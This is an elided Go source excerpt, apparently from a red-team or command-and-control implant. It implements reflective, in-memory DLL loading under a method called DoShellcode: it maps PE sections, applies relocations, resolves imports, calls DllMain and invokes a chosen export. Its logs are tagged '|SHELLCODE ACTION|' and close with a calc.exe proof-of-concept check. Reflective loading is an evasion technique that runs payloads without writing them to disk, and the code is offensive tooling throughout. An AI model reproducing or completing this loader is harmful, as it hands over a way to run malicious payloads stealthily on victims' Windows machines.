...
type IMAGE_EXPORT_DIRECTORY struct {                                                                              //nolint:revive
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
...
func (rl *windowsShellcode) DoShellcode(
	...
	log.Printf("|SHELLCODE ACTION| [+] Target ImageBase: 0x%X", optionalHeader.ImageBase)
	log.Printf("|SHELLCODE ACTION| [+] Target SizeOfImage: 0x%X (%d bytes)", optionalHeader.SizeOfImage, optionalHeader.SizeOfImage)

	// ALLOCATE MEMORY FOR DLL
	log.Printf("|SHELLCODE ACTION| [+] Allocating 0x%X bytes of memory for DLL...", optionalHeader.SizeOfImage)
	...
	if err != nil {
		log.Printf("|SHELLCODE ACTION| [*] Failed to allocate at preferred base 0x%X: %v. Trying arbitrary address...", preferredBase, err)
	...
	log.Printf("|SHELLCODE ACTION| [+] DLL memory allocated successfully at actual base address: 0x%X", allocBase)

	// COPY HEADERS INTO ALLOCATED MEMORY
	log.Printf("|SHELLCODE ACTION| [+] Copying PE headers (%d bytes) to allocated memory...", optionalHeader.SizeOfHeaders)
	...
	log.Printf("|SHELLCODE ACTION| [+] Copied %d bytes of headers successfully.", bytesCopied)

	// COPY SECTIONS INTO ALLOCATED MEMORY
	log.Println("|SHELLCODE ACTION| [+] Copying sections...")
	...
	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		...
		if sectionHeader.PointerToRawData == 0 {
			log.Printf("|SHELLCODE ACTION| [*] Skipping section '%s' with no PointerToRawData.", sectionNameToString(sectionHeader.Name))
			continue
		}
	...
	log.Println("|SHELLCODE ACTION| [+] All sections copied.")

	// PROCESS BASE RELOCATIONS
	log.Println("|SHELLCODE ACTION| [+] Checking if base relocations are needed...")
	delta := int64(allocBase) - int64(optionalHeader.ImageBase)
	if delta == 0 {
		log.Println("|SHELLCODE ACTION| [+] Image loaded at preferred base. No relocations needed.")
	} else {
		log.Printf("|SHELLCODE ACTION| [+] Image loaded at non-preferred base (Delta: 0x%X). Processing relocations...", delta)
		...
		if relocDirRVA == 0 || relocDirSize == 0 {
			...
			log.Printf("|SHELLCODE ACTION| [+] Relocation Directory found at RVA 0x%X, Size 0x%X", relocDirRVA, relocDirSize)
			...
			log.Printf("|SHELLCODE ACTION| [+] Relocation processing complete. Total fixups applied: %d", totalFixups)
		}
	}

	// PROCESS IMPORT ADDRESS TABLE (IAT)
	log.Println("|SHELLCODE ACTION| [+] Processing Import Address Table (IAT)...")
	importDirEntry := optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
	importDirRVA := importDirEntry.VirtualAddress
	if importDirRVA == 0 {
		log.Println("|SHELLCODE ACTION| [*] No Import Directory found. Skipping IAT processing.")
	} else {
		log.Printf("|SHELLCODE ACTION| [+] Import Directory found at RVA 0x%X", importDirRVA)
		...
		for i := 0; ; i++ {
			...
			for j := uintptr(0); ; j++ {
				...
				if iltEntryAddr < allocBase || iltEntryAddr+entrySize > allocBase+allocSize {
				...
				if iltEntry&IMAGE_ORDINAL_FLAG64 != 0 {
					...
					funcName := windows.BytePtrToString((*byte)(unsafe.Pointer(hintNameAddr + 2)))
			...
			log.Printf("|SHELLCODE ACTION| [+] Finished imports for '%s'.", dllName)
		}
		log.Printf("|SHELLCODE ACTION| [+] Import processing complete (%d DLLs).", importCount)
	}

	// CALL DLL ENTRY POINT
	log.Println("|SHELLCODE ACTION| [+] Locating and calling DLL Entry Point (DllMain)...")
	dllEntryRVA := optionalHeader.AddressOfEntryPoint
	if dllEntryRVA == 0 {
		log.Println("|SHELLCODE ACTION| [*] DLL has no entry point. Skipping DllMain call.")
	} else {
		entryPointAddr := allocBase + uintptr(dllEntryRVA)
		log.Printf("|SHELLCODE ACTION| [+] DllMain at VA 0x%X. Calling with DLL_PROCESS_ATTACH...", entryPointAddr)
		...
		log.Println("|SHELLCODE ACTION| [+] DllMain executed successfully (returned TRUE).")
	}

	// FIND + CALL EXPORTED FUNCTION
	targetFunctionName := exportName
	log.Printf("|SHELLCODE ACTION| [+] Locating exported function: %s", targetFunctionName)
	...
	if exportDirRVA == 0 {
		...
		for i := uint32(0); i < exportDir.NumberOfNames; i++ {
			...
			if funcName == targetFunctionName {
				...
				log.Printf("|SHELLCODE ACTION| [+] Found target function '%s' at VA: 0x%X", targetFunctionName, targetFuncAddr)
				break
			}
		}
	}
	...
	log.Printf("|SHELLCODE ACTION| [+] Calling target function '%s' at 0x%X...", targetFunctionName, targetFuncAddr)
	...
	log.Printf("|SHELLCODE ACTION| [+] Exported function '%s' executed successfully (returned TRUE/non-zero: %d).", targetFunctionName, retExport)
	log.Printf("|SHELLCODE ACTION| ==> Check if '%s' (e.g., Calculator) launched by DLL! <===", "calc.exe")
